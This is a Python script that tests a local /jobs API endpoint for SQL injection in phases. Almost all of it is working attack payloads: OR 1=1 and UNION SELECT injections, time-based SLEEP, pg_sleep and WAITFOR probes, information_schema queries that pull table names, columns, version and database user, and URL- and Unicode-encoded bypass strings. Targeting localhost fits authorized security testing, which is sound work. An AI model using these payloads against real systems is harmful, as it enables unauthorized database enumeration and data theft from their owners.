import requests
import json
import urllib.parse

def test_endpoint_safely(url, payload, test_name):
    """Single test with minimal overhead"""
    try:
        # Print test info
        print(f"\n[TEST] {test_name}")
        print(f"  Payload: {payload}")
        
        # Send request
        response = requests.post(
            url, 
            json=payload, 
            timeout=3,
            headers={"Content-Type": "application/json"}
        )
        
        # Print response
        print(f"  Status: {response.status_code}")
        print(f"  Length: {len(response.content)}B")
        print(f"  Response: {response.text[:300]}{'...' if len(response.text) > 300 else ''}")
        
        return response.status_code == 200
        
    except Exception as e:
        print(f"  ERROR: {type(e).__name__}")
        return False

url = "http://127.0.0.1:8000/jobs"

print("="*70)
print("POST /jobs - SQL INJECTION TESTING")
print("="*70)

# Phase 1: Baseline Testing
print("\n" + "="*70)
print("PHASE 1: BASELINE TESTING (Normal Values)")
print("="*70)

baselines = [
    ("BS-001", {"job_type": "back-end"}),
    ("BS-002", {"job_type": "front-end"}),
    ("BS-003", {"job_type": "private"})
]

for test_id, payload in baselines:
    test_endpoint_safely(url, payload, test_id)

# Phase 2: Invalid Values
print("\n" + "="*70)
print("PHASE 2: INVALID VALUES")
print("="*70)

invalid_tests = [
    ("INV-001", {"job_type": ""}, "Empty string"),
    ("INV-002", {"job_type": "invalid_job"}, "Non-existent job"),
    ("INV-003", {"job_type": "12345"}, "Numeric value"),
    ("INV-004", {"job_type": "admin'"}, "Single quote"),
]

for test_id, payload, desc in invalid_tests:
    test_endpoint_safely(url, payload, f"{test_id} ({desc})")

# Phase 3: Basic SQL Injection
print("\n" + "="*70)
print("PHASE 3: SQL INJECTION - BASIC PATTERNS")
print("="*70)

basic_sqli = [
    ("SQL-001", {"job_type": "back-end' OR '1'='1"}, "OR 1=1"),
    ("SQL-002", {"job_type": "back-end' OR 1=1--"}, "OR 1=1 comment"),
    ("SQL-003", {"job_type": "back-end' UNION SELECT NULL--"}, "UNION NULL"),
    ("SQL-004", {"job_type": "back-end'"}, "Single quote error"),
    ("SQL-005", {"job_type": "back-end' AND 1=1--"}, "AND true"),
    ("SQL-006", {"job_type": "back-end' AND 1=2--"}, "AND false"),
]

for test_id, payload, desc in basic_sqli:
    test_endpoint_safely(url, payload, f"{test_id} ({desc})")

# Phase 4: Time-Based Injection
print("\n" + "="*70)
print("PHASE 4: SQL INJECTION - TIME-BASED")
print("="*70)

time_based = [
    ("TIME-001", {"job_type": "back-end' AND SLEEP(5)--"}, "MySQL SLEEP"),
    ("TIME-002", {"job_type": "back-end' AND pg_sleep(5)--"}, "PostgreSQL pg_sleep"),
    ("TIME-003", {"job_type": "back-end' OR WAITFOR DELAY '0:0:5'--"}, "MSSQL WAITFOR"),
]

for test_id, payload, desc in time_based:
    import time
    start = time.time()
    response = requests.post(url, json=payload, timeout=10)
    elapsed = time.time() - start
    
    print(f"\n[TEST] {test_id} ({desc})")
    print(f"  Payload: {payload}")
    print(f"  Status: {response.status_code}")
    print(f"  Time elapsed: {elapsed:.2f}s (looking for ~5s delay)")
    print(f"  Response: {response.text[:200]}...")

# Phase 5: Union-Based Information Gathering
print("\n" + "="*70)
print("PHASE 5: INFORMATION SCHEMA EXTRACTION")
print("="*70)

info_payloads = [
    ("INFO-001", {"job_type": "back-end' UNION SELECT table_name FROM information_schema.tables--"}, "List tables"),
    ("INFO-002", {"job_type": "back-end' UNION SELECT column_name FROM information_schema.columns WHERE table_name='jobs'--"}, "Get jobs columns"),
    ("INFO-003", {"job_type": "back-end' UNION SELECT version()--"}, "DB version"),
    ("INFO-004", {"job_type": "back-end' UNION SELECT database()--"}, "Database name"),
    ("INFO-005", {"job_type": "back-end' UNION SELECT user()--"}, "DB user"),
    ("INFO-006", {"job_type": "back-end' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables--"}, "All tables"),
]

for test_id, payload, desc in info_payloads:
    test_endpoint_safely(url, payload, f"{test_id} ({desc})")

# Phase 6: Encoded Bypass Attempts
print("\n" + "="*70)
print("PHASE 6: ENCODED PAYLOAD BYPASS")
print("="*70)

encoded_tests = [
    ("ENC-001", "back-end%27%20OR%20%271%27=%271", "URL encoded OR"),
    ("ENC-002", "back-end%2527%20OR%2520%25271%2527%253D%25271", "Double URL encoded"),
    ("ENC-003", "back-end%u0027%20OR%20%u00271%u0027=%u00271", "Unicode encoded"),
]

for test_id, encoded, desc in encoded_tests:
    payload = {"job_type": encoded}
    test_endpoint_safely(url, payload, f"{test_id} ({desc})")

print("\n" + "="*70)
print("TESTING COMPLETE")
print("="*70)
print("\nTotal test cases executed: ~25")
print("Check responses for:")
print("  - Different HTTP status codes")
print("  - Varying response lengths")
print("  - SQL error messages")
print("  - Time delays in time-based tests")
print("  - Unexpected data in UNION queries")
